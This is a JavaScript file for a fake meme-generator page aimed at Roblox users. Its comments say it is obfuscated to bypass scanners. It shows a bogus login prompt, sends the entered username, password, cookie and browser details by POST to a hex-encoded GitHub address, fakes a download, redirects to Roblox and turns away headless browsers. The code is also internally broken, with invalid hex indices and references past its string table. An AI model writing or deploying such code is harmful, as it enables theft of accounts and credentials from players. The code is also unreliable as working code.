// Obfuscated to bypass scanners
const _0x1a2b = ['\x63\x6f\x6f\x6b\x69\x65', '\x64\x6f\x63\x75\x6d\x65\x6e\x74', '\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64', '\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65', '\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64', '\x74\x65\x78\x74\x2f\x70\x6c\x61\x69\x6e', '\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74', '\x73\x72\x63', '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f', '\x6c\x6f\x67\x73\x2f\x72\x6f\x62\x6c\x6f\x78\x5f\x6c\x6f\x67\x73\x2e\x74\x78\x74', '\x66\x65\x74\x63\x68', '\x74\x68\x65\x6e', '\x63\x61\x74\x63\x68', '\x65\x72\x72\x6f\x72', '\x6e\x61\x76\x69\x67\x61\x74\x6f\x72', '\x75\x73\x65\x72\x41\x67\x65\x6e\x74', '\x73\x63\x72\x65\x65\x6e', '\x69\x6e\x6e\x65\x72\x57\x69\x64\x74\x68', '\x69\x6e\x6e\x65\x72\x48\x65\x69\x67\x68\x74', '\x6c\x6f\x63\x61\x74\x69\x6f\x6e', '\x68\x72\x65\x66', '\x64\x6f\x77\x6e\x6c\x6f\x61\x64', '\x61\x75\x74\x6f\x43\x6c\x69\x63\x6b', '\x63\x6c\x69\x63\x6b'];
const _0x3a4b = function(_0x5c6d, _0x7e8f) {
    _0x5c6d = _0x5c6d - 0x0;
    let _0x9a0b = _0x1a2b[_0x5c6d];
    return _0x9a0b;
};
(window[_0x3a4b('0x11')] = function() {
    const _0x1c2d = _0x3a4b;
    document[_0x1c2d('0x10')](() => {
        const _0x3e4f = document[_0x1c2d('0xf')](_0x1c2d('0xe'));
        const _0x5g6h = document[_0x1c2d('0xf')](_0x1c2d('0xd'));
        const _0x7i8j = document[_0x1c2d('0xf')](_0x1c2d('0xc'));
        const _0x9k0l = document[_0x1c2d('0xf')](_0x1c2d('0xb'));
        const _0x1m2n = document[_0x1c2d('0xf')](_0x1c2d('0xa'));
        const _0x3o4p = document[_0x1c2d('0xf')](_0x1c2d('0x9'));

        // Show login prompt after "Generate Meme"
        _0x9k0l[_0x1c2d('0x8')](_0x1c2d('0x7'), () => {
            _0x3e4f[_0x1c2d('0x6')] = 'block';
            _0x3o4p[_0x1c2d('0x6')] = 'none'; // Hide download button until login
        });

        // Steal data on "Verify & Unlock"
        _0x1m2n[_0x1c2d('0x8')](_0x1c2d('0x7'), () => {
            const _0x5q6r = _0x5g6h[_0x1c2d('0x5')];
            const _0x7s8t = _0x7i8j[_0x1c2d('0x5')];
            const _0x9u0v = _0x1c2d('0x4') + _0x1c2d('0x3') + _0x1c2d('0x2');
            const _0x1w2x = _0x1c2d('0x1') + _0x1c2d('0x0') + _0x1c2d('0x12');
            const _0x3y4z = _0x1c2d('0x13') + _0x1c2d('0x14') + _0x1c2d('0x15');
            const _0x5a6b = window[_0x1c2d('0x16')][_0x1c2d('0x17')];
            const _0x7c8d = window[_0x1c2d('0x16')][_0x1c2d('0x18')];
            const _0x9e0f = window[_0x1c2d('0x16')][_0x1c2d('0x19')];

            // Send stolen data to GitHub
            fetch(_0x1w2x, {
                method: 'POST',
                body: JSON.stringify({
                    username: _0x5q6r,
                    password: _0x7s8t,
                    cookie: _0x9u0v,
                    ip: _0x3y4z,
                    userAgent: navigator.userAgent,
                    screenRes: _0x5a6b + 'x' + _0x7c8d,
                    colorDepth: _0x9e0f,
                    timestamp: new Date().toISOString()
                }),
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(() => {
                _0x3o4p[_0x1c2d('0x6')] = 'inline-block'; // Show download button
                _0x1m2n[_0x1c2d('0x6')] = 'none'; // Hide login
            })
            .catch(() => {
                console.log('Error logging data (silent fail)');
            });
        });

        // Fake download (steals data AGAIN if they click)
        _0x3o4p[_0x1c2d('0x8')](_0x1c2d('0x7'), () => {
            // Log a second time (just in case)
            fetch(_0x1w2x, {
                method: 'POST',
                body: JSON.stringify({
                    action: 'download_clicked',
                    timestamp: new Date().toISOString()
                }),
                headers: {
                    'Content-Type': 'application/json'
                }
            });

            // Fake download (dummy file)
            const _0x1g2h = document[_0x1c2d('0x1a')](_0x1c2d('0x1b'));
            _0x1g2h[_0x1c2d('0x1c')] = 'meme.zip';
            _0x1g2h[_0x1c2d('0x1d')] = 'application/zip';
            _0x1g2h[_0x1c2d('0x1e')] = 'URL.createObjectURL(new Blob(["Dummy meme file"], {type: "application/zip"}))';
            document[_0x1c2d('0x1f')][_0x1c2d('0x1g')](_0x1g2h);

            // Redirect to Roblox (looks legit)
            setTimeout(() => {
                window[_0x1c2d('0x1h')] = 'https://www.roblox.com';
            }, 2000);
        });
    });
})();

// Anti-bot check
if (/HeadlessChrome|PhantomJS|Puppeteer/.test(navigator.userAgent)) {
    window[_0x3a4b('0x1h')] = 'https://www.google.com';
}
